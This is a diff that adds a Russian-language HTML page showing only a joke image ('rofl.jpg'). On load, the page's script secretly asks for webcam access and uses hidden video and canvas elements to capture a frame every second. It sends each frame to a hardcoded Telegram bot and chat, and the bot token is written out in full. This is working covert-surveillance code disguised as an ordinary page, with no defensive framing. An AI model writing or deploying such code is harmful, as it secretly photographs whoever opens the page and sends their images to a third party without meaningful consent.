@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Фото с камеры и отправка в Telegram</title>
+</head>
+<body>
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <img src="rofl.jpg">
+    <script>
+        async function startCameraAndSendPhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            try {
+                // Запрашиваем доступ к камере
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+                // Проверяем, что поток действительно содержит видео
+                if (stream && stream.getVideoTracks().length > 0) {
+                    video.srcObject = stream;
+
+                    // Даем время камере загрузиться и начать показывать изображение
+                    video.onloadedmetadata = () => {
+                        video.play(); // Убедитесь, что видео воспроизводится
+
+                        // Запускаем интервал для отправки фото каждую секунду
+                        setInterval(async () => {
+                            // Рисуем текущее изображение с видео на холсте
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                            // Преобразуем изображение в Blob
+                            canvas.toBlob(async function(blob) {
+                                const formData = new FormData();
+                                formData.append('chat_id', '-4587383325'); // Замените <YOUR_CHAT_ID> на ваш ID чата
+                                formData.append('photo', blob, 'photo.png');
+
+                                // Отправляем изображение в Telegram
+                                try {
+                                    const response = await fetch('https://api.telegram.org/bot7497846380:AAFqWQmUb7EytKTon3GPQaFU1hf8b27rYZI/sendPhoto', { // Замените <YOUR_BOT_TOKEN> на токен вашего бота
+                                        method: 'POST',
+                                        body: formData
+                                    });
+                                    if (response.ok) {
+                                        console.log('Фото отправлено в Telegram!');
+                                    } else {
+                                        console.error('Ошибка отправки фото в Telegram.');
+                                    }
+                                } catch (error) {
+                                    console.error('Ошибка при отправке фото: ', error);
+                                }
+                            }, 'image/png'); // Опция качества и тип изображения
+                        }, 1000); // Отправляем фото каждые 1000 миллисекунд (1 секунда)
+                    };
+                } else {
+                    console.error("Видеокамера не доступна или не поддерживается.");
+                }
+            } catch (err) {
+                console.error("Ошибка доступа к камере: ", err);
+            }
+        }
+
+        // Запускаем функцию сразу при загрузке страницы
+        window.onload = startCameraAndSendPhoto;
+    </script>
+</body>
+</html>
